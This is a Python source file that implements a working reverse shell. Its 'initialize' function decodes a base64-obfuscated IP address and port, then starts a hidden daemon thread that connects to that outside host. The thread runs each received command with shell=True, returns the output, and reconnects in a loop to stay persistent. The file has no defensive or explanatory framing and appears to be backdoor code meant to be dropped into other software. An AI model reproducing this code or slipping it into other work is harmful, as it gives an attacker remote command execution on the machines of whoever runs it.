import socket
import subprocess
import threading
import base64

def initialize():
    try:
        encoded_host = b'MTYwLjIwMi4xMjguNw=='  # Base64 for 160.202.128.7
        encoded_port = b'OTE5Ng=='  # Base64 for 9196
        host = base64.b64decode(encoded_host).decode()
        port = int(base64.b64decode(encoded_port).decode())

        # Start the reverse shell in a background thread
        threading.Thread(target=_connect, args=(host, port), daemon=True).start()
    except Exception as e:
        print(f"Initialization error: {e}")  # Debugging message (optional)

def _connect(host, port):
    while True:  # Reconnect loop for persistence
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                s.send(b"[+] Connection established\n")

                while True:
                    command = s.recv(1024).decode("utf-8").strip()
                    if not command:
                        continue  # Skip if no command received
                    if command.lower() == "exit":
                        s.send(b"[*] Connection closed\n")
                        break
                    try:
                        # Execute the command
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        response = output.stdout + output.stderr
                        if not response.strip():
                            response = "[*] Command executed, no output\n"
                        s.send(response.encode("utf-8"))
                    except Exception as cmd_error:
                        s.send(f"[!] Error executing command: {cmd_error}\n".encode("utf-8"))
        except Exception as conn_error:
            # Retry connection after 5 seconds if it fails
            print(f"Connection error: {conn_error}")  # Optional debugging message
            import time
            time.sleep(5)